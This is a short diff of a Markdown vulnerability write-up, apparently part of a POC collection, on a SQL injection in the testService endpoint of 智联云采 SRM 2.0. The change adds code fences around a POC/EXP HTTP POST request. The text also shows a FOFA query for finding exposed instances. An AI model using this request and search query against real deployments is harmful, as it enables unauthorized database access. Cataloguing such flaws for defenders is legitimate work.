@@ -86,6 +86,7 @@ FOFA：title=="SRM 2.0"
 
 POC/EXP：
 
+```http
 POST /adpweb/a/ica/api/testService HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
@@ -100,6 +101,8 @@ Content-Type: application/json
     "serviceName": "q",
     "serviceParams": "{\"lang\":\"zh_CN\"}"
 }
+```
+
 
 ![image-20241018110418434](./.resource/智联云采SRM2.0testServiceSQL注入漏洞/media/image-20241018110418434.png)
 
